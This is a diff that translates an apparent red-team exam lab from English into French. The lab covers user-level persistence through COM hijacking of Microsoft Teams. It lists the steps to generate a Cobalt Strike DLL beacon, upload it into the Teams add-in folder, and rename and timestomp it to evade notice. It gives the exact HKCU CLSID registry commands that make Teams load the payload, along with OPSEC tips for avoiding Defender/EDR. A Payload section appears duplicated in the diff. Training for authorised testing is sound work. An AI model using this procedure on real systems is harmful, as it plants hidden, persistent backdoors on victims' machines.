@@ -1,8 +1,8 @@
-# Persistence Lab
+# Lab — Persistence utilisateur
 
-> **Methodology context:** This is **Phase 5 — User-Level Persistence**. Deploy immediately after first beacon checks in, before any privesc or lateral movement. If you lose the beacon (lab save/restore, Teams restarts), this is what brings it back — no admin required.
+> **Contexte méthodologique :** cette étape correspond à la **phase 5 — User-Level Persistence**. Elle se déroule après le premier check-in du Beacon, avant Privilege Escalation et Lateral Movement. Cette méthode vise à conserver l’accès après une interruption de session, sans droits administrateur.
 
-> **Where this fits in the exam attack chain:**
+> **Place dans la chaîne d’attaque de l’examen :**
 > ```
 > Defence evasion prep → AppLocker bypass → Initial Access (beacon in msedge.exe)
 >   → [THIS LAB] COM hijack persistence (user-level, no admin)
@@ -11,98 +11,98 @@
 >   → Credential Access → Lateral Movement → ...
 > ```
 
-> **Why COM hijack over other persistence techniques (OPSEC ranking):**
-> | Technique | Admin needed | Disk write | Registry write | Noise |
+> **Pourquoi choisir un COM hijack ? Comparaison OPSEC :**
+> | Technique | Admin requis | Écriture disque | Écriture Registry | Bruit |
 > |-----------|-------------|------------|----------------|-------|
-> | **COM hijack (HKCU)** | No | Yes (DLL) | HKCU only | Low — trusted process loads it |
-> | Registry Run key | No | Yes | HKCU/HKLM | High — signatured by Defender/EDR |
-> | WMI subscription | Yes | Yes | Yes | Medium — requires elevated beacon |
+> | **COM hijack (HKCU)** | Non | Oui (DLL) | HKCU uniquement | Faible — chargement par processus légitime |
+> | Registry Run key | Non | Oui | HKCU/HKLM | Élevé — détectable par Defender/EDR |
+> | WMI subscription | Oui | Oui | Oui | Moyen — nécessite un Beacon privilégié |
 >
-> COM hijack wins at user-level because: registry write stays in HKCU (no admin), beacon runs inside a signed Microsoft process (Teams), and Teams restarts naturally on every login — triggering your DLL automatically.
+> Le COM hijack peut fonctionner au niveau utilisateur : les modifications Registry restent dans HKCU, le Beacon est chargé par un processus Microsoft signé (Teams) et le redémarrage de Teams peut déclencher à nouveau la DLL.
 
-> **Exam-day checklist before running this lab:**
-> - [ ] Malleable C2 profile active & docker restarted
-> - [ ] Artifact Kit loaded (`artifact.cna`) — the DLL payload must survive Defender static scan
-> - [ ] Beacon running as target user (pchilds) with at least medium integrity
-> - [ ] `spawnto` set away from `rundll32.exe` before generating the DLL
+> **Checklist avant ce lab :**
+> - [ ] Malleable C2 Profile actif et Docker redémarré
+> - [ ] Artifact Kit chargé (`artifact.cna`) — vérifier le comportement du payload DLL face à Defender
+> - [ ] Beacon exécuté sous l’utilisateur cible (`pchilds`) avec au moins medium integrity
+> - [ ] `spawnto` personnalisé avant la génération de la DLL
 
-> **OPSEC classification:** `OPSEC-🟠CAUTION` — DLL written to disk (survives disk scan if Artifact Kit is clean). Registry writes to HKCU only (no admin, no Event 4657 for HKLM). Teams loading an unrecognised DLL is the detection risk.
-
-===
-
-## Payload
-
-1. Launch Cobalt Strike and connect to the team server.
-1. Generate a DLL payload:
-    1. **Payloads > Windows Stageless Payload**
-    2. Listener: **http**
-    3. Output: **Windows DLL**
-    4. Exit Function: **Thread**
-    5. Click **Generate**.
-    6. Save it to `C:\Payloads\http_x64.dll`
-
-⚠️ Choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.
-
-> **Why Thread exit, not Process:** If set to Process, exiting the beacon kills `ms-teams.exe` — Teams crashes, user notices, and persistence is burned. Thread exit terminates only the beacon thread; Teams keeps running normally.
+> **Classification OPSEC :** `OPSEC-🟠CAUTION`. La DLL est écrite sur disque et la configuration est modifiée dans HKCU. Le chargement d’une DLL inhabituelle par Teams peut être détecté.
 
 ===
 
 ## Payload
 
-1. Launch Cobalt Strike and connect to the team server.
-1. Generate a DLL payload:
+1. Lancer Cobalt Strike et se connecter au team server.
+1. Générer un payload DLL :
     1. **Payloads > Windows Stageless Payload**
     2. Listener: **http**
     3. Output: **Windows DLL**
     4. Exit Function: **Thread**
-    5. Click **Generate**.
-    6. Save it to `C:\Payloads\http_x64.dll`
+    5. Cliquer sur **Generate**.
+    6. Enregistrer dans `C:\Payloads\http_x64.dll`
 
-⚠️ Choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.
+⚠️ Choisir **Thread** comme Exit Function afin de ne pas terminer le processus hôte à la fermeture du Beacon.
+
+> **Pourquoi Thread et pas Process ?** L’option Process peut fermer `ms-teams.exe` quand le Beacon se termine. Thread ferme uniquement le thread du Beacon et laisse Teams fonctionner.
+
+===
+
+## Payload
+
+1. Lancer Cobalt Strike et se connecter au team server.
+1. Générer un payload DLL :
+    1. **Payloads > Windows Stageless Payload**
+    2. Listener: **http**
+    3. Output: **Windows DLL**
+    4. Exit Function: **Thread**
+    5. Cliquer sur **Generate**.
+    6. Enregistrer dans `C:\Payloads\http_x64.dll`
+
+⚠️ Choisir **Thread** comme Exit Function afin de ne pas terminer le processus hôte à la fermeture du Beacon.
 
 ===
 
 ## COM Hijack
 
-From the Beacon running as pchilds:
+Depuis le Beacon exécuté sous `pchilds` :
 
-1. Change Beacon's working directory.  
+1. Changer le working directory du Beacon.  
 ```sh
 cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
 ```
-2. Upload the DLL payload to disk.  
+2. Uploader le payload DLL sur le disque.  
 ```
 upload C:\Payloads\http_x64.dll
 ```
-3. Rename and timestomp the DLL to help it blend in with the existing files.  
+3. Renommer la DLL et appliquer un **timestomp** pour l’aligner sur les fichiers existants.  
 ```
 mv http_x64.dll Microsoft.Teams.HttpClient.dll
 timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
 ```
-4. Add the registry entries to perform the COM hijack:  
+4. Ajouter les entrées Registry nécessaires au **COM hijack** :  
 ```beacon-nocolor
 reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
 reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
 ```
-4. Switch to `lon-wkstn-1` and login with `Password`  
-5. From the Windows start menu, launch Microsoft Teams.  
-6. Switch back to the attacker-desktop. Select Link and a new Beacon should appear from `ms-teams.exe`  
+4. Passer sur `lon-wkstn-1` et se connecter avec `Password` (tel qu’indiqué dans le lab)  
+5. Lancer Microsoft Teams depuis le menu Démarrer.  
+6. Revenir à l’Attacker Desktop, sélectionner **Link** : un nouveau Beacon doit apparaître depuis `ms-teams.exe`.  
 
-⚠️ Leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.
+⚠️ Cette technique utilise le COM hijack pour faire charger un payload Beacon par une application Microsoft signée.
 
 ----  
 
-## Exam Day Notes
+## Notes pour l’examen
 
-**Trigger condition:** Teams restarts → DLL loaded → beacon calls back. On exam day Teams may not restart automatically — you may need to log out and back in to trigger it. Set persistence early, then move on; don't wait.
+**Condition de déclenchement :** redémarrage de Teams → chargement DLL → callback Beacon. Si Teams ne redémarre pas automatiquement, une nouvelle connexion utilisateur peut être nécessaire. Configurer la persistence avant de poursuivre.
 
-**Verification after Teams loads the DLL:**
+**Vérification après chargement de la DLL par Teams :**
 ```cs
 beacon> getuid          // confirm it's the correct user
 beacon> process_browser // GUI tab — confirm beacon PID is inside ms-teams.exe, right-click options available
 ```
 
-**Cleanup (if needed before exam submit):**
+**Cleanup (si nécessaire avant la soumission de l’examen) :**
 ```cs
 // Remove the registry entries
 reg_delete HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"
@@ -111,9 +111,9 @@ reg_delete HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"
 rm C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll
 ```
 
-**What to do next:** Once persistence is confirmed, proceed to `labs/Privilege-Escalation-lab.md` to escalate to SYSTEM, then `labs/Elevated-Persistence-lab.md` for SYSTEM-level WMI persistence that survives reboots without relying on a user-space trigger.
+**Étape suivante :** après avoir vérifié la persistence, suivre `labs/Privilege-Escalation-lab.md` pour obtenir SYSTEM, puis `labs/Elevated-Persistence-lab.md` pour la persistence WMI au niveau SYSTEM.
 
-> **Key difference from Elevated-Persistence-lab.md:**
-> - This lab = user-level, triggers when Teams starts, requires target user to be logged in
-> - Elevated-Persistence-lab.md = SYSTEM-level, triggers on GPO refresh (gpupdate), survives reboots, no user interaction needed — but requires an elevated SYSTEM beacon first
+> **Différence avec Elevated-Persistence-lab.md :**
+> - Ce lab = user-level ; déclenché au démarrage de Teams ; nécessite une session de l’utilisateur cible
+> - Elevated-Persistence-lab.md = SYSTEM-level ; déclenché par une actualisation GPO (`gpupdate`) ; ne dépend pas d’une session interactive, mais nécessite d’abord un Beacon SYSTEM.
 
